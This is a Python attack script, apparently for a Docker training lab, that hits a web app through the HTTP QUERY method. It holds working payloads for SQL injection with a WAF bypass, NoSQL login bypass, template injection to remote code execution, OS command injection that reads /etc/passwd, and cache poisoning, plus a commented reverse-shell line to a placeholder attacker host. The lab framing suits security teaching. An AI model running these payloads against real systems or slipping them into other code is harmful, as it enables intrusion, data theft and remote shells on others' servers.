#!/usr/bin/env python3
"""QUERY-method (RFC 10008) attack harness for the Docker lab.

Usage (inside lab):   python attack.py
Usage (from host):    BASE_URL=http://localhost:3000 python attack.py
"""
import json, os
import requests

BASE = os.environ.get("BASE_URL", "http://app:3000").rstrip("/")
G, R, Y, C, B, X = "\033[92m", "\033[91m", "\033[93m", "\033[96m", "\033[1m", "\033[0m"

def banner(t): print(f"\n{B}{'='*70}\n[>] {t}\n{'='*70}{X}")

def send(method, path, body=None, show=True, timeout=30):
    r = requests.request(method, BASE + path, json=body, timeout=timeout)
    print(f"{C}{method:6s}{X} {path}  ->  {B}{r.status_code}{X}")
    if show:
        try: print("   " + json.dumps(r.json(), indent=2)[:1500])
        except Exception: print("   " + r.text[:400])
    return r

# ------------------------------------------------ 0. method semantics
# NOTE: uses /api/search/products (uncached) so it does NOT seed the
#       catalog cache that section 6 relies on.
banner("0. Method semantics: QUERY vs GET vs unknown methods")
send("QUERY", "/api/search/products", {"q": "monitor", "page": 1})
send("GET",   "/api/search/catalog")            # 405 + Allow: QUERY, OPTIONS
send("OPTIONS", "/api/search/catalog")          # 204 + Allow header
send("BREW",  "/api/search/catalog")            # unknown method
send("QUERY", "/api/nope")                      # valid method, missing route -> 404

# ------------------------------------------------ 1. SQL injection
banner("1. SQL injection in QUERY body  (POST twin WAF-guarded, QUERY not)")
send("QUERY", "/api/search/products", {"q": "keyboard"})           # baseline
send("QUERY", "/api/search/products", {"q": "' OR 1=1 -- "})       # boolean full dump
send("QUERY", "/api/search/products",
     {"q": "' UNION SELECT 1, sql, 1, 1 FROM sqlite_master -- "})  # schema via UNION
send("QUERY", "/api/search/products",
     {"q": "' OR (SELECT CASE WHEN (SELECT count(*) FROM products)=6 "
           "THEN randomblob(50000000) ELSE 0 END) -- "},           # timing oracle
     show=False, timeout=60)

# ------------------------------------------------ 2. WAF bypass diff
banner("2. Differential WAF bypass: POST (blocked) vs QUERY (passes)")
send("POST",  "/api/search/products", {"q": "' OR 1=1 -- "})   # 403
send("QUERY", "/api/search/products", {"q": "' OR 1=1 -- "})   # 200 full dump

# ------------------------------------------------ 3. NoSQLi
banner("3. NoSQL operator injection  (/api/auth/login)")
send("QUERY", "/api/auth/login", {"username": "admin", "password": "wrong"})       # 401
send("QUERY", "/api/auth/login", {"username": "admin", "password": {"$ne": ""}})   # 200 admin
send("QUERY", "/api/auth/login",
     {"username": {"$regex": "^adm"}, "password": {"$ne": "x"}})                   # 200

# ------------------------------------------------ 4. SSTI -> RCE
banner("4. Server-Side Template Injection (EJS) -> RCE in QUERY body")
send("QUERY", "/api/render/email", {"template": "<%= 7 * 7 %>"})
send("QUERY", "/api/render/email",
     {"template": "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"})
send("QUERY", "/api/render/email",
     {"template": "<%= global.process.mainModule.require('child_process')"
                  ".execSync('cat /app/data/products.txt | head -3').toString() %>"})

# ------------------------------------------------ 5. command injection
# FIXED: `</dev/null` gives the leading `grep` immediate EOF so the
# chained commands actually execute (old payloads hung -> "exit": null).
banner("5. OS command injection in QUERY body  (/api/export/report)")
send("QUERY", "/api/export/report", {"grep": "monitor"})               # baseline
send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; id; #'})
send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; uname -a; #'})
send("QUERY", "/api/export/report", {"grep": 'x" </dev/null; cat /etc/passwd | head -5; #'})
# reverse shell variant (lab only):
# {"grep": 'x" </dev/null; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1; #'}

# ------------------------------------------------ 6. cache poisoning
# RFC 10008: QUERY responses are cacheable BUT the cache key MUST
# include the request body. This cache keys on METHOD|PATH only ->
# one slot for the whole endpoint -> first body wins, forever.
banner("6. Body-blind cache poisoning (cache key ignores request body)")
send("QUERY", "/api/search/catalog", {"q": "monitor", "page": 1})   # cached: false -> SEEDS slot
send("QUERY", "/api/search/catalog", {"q": "keyboard", "page": 1})  # cached: true, monitor data!
send("QUERY", "/api/search/catalog", {"q": "usb", "page": 1})       # cached: true, still poisoned
# attacker-controlled variant (real-world): seed with a body whose
# response embeds attacker content (XSS gadget), then every user of
# the endpoint receives it until expiry.

print(f"\n{G}done.{X}")
